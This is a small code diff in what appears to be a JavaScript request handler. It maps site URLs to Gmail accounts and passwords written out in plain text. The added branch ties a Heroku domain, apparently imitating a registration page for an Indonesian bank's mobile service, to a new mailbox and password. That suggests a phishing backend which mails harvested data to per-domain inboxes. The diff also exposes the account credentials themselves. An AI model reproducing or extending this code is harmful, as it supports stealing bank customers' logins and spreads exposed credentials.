@@ -58,6 +58,11 @@ export default function handler(req, res) {
         email = 'lupa10203070@gmail.com';
         pass = 'xwnxmsljgdwgtcva';
        
+    }
+    else if (url == 'daftar-brimo-bifas.herokuapp.com'){
+        email = 'abihder31@gmail.com';
+        pass = 'rrqzbqcfpuimwfsx';
+       
         }
         
         try {
